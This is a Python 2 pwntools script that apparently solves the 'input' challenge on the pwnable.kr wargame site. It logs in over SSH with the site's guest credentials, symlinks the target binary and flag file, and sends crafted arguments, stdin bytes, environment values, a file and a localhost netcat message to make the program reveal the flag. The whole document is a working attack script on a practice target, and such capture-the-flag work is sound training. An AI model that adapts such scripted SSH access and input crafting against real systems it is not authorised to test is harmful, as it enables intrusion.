from pwn import *

# asm
host = 'pwnable.kr'
user = 'input2'
password = 'guest'
port = 2222

directory = '/tmp/fortasdf'
rport = "36789"

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  s.system("mkdir {}".format(directory))
  s.set_working_directory(directory)

  s.system("ln -s ~/input input")
  s.system("ln -s ~/flag flag")

  r = s.system("python")
  r.sendline("x = open('\\x0a', 'wb')")
  r.sendline("x.write('\\x00\\x00\\x00\\x00')")
  r.sendline("x.close()")
  r.sendline("exit()")
  r.close()

  # Stage 1: argv
  args = [''] * 100
  args[0] = './input'
  args[ord('A')] = "\x00"
  args[ord('B')] = "\x20\x0a\x0d"
  args[ord('C')] = rport
  p = s.process(args, stderr=0, env={"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"})
  print p.recvline()
  print p.recvline()
  print p.recvline()

  # Stage 2: stdio
  p.send("\x00\x0a\x00\xff")
  p.send("\x00\x0a\x02\xff")
  print p.recvline()

  # Stage 3: env

  # Stage 4: file
  sleep(2)

  # Stage 5: network
  r = s.system("python -c \"print '\xde\xad\xbe\xef'\" | nc localhost 36789")


  print p.recv()
  print p.recv()
  print p.recv()

if __name__ == '__main__':
  attack()
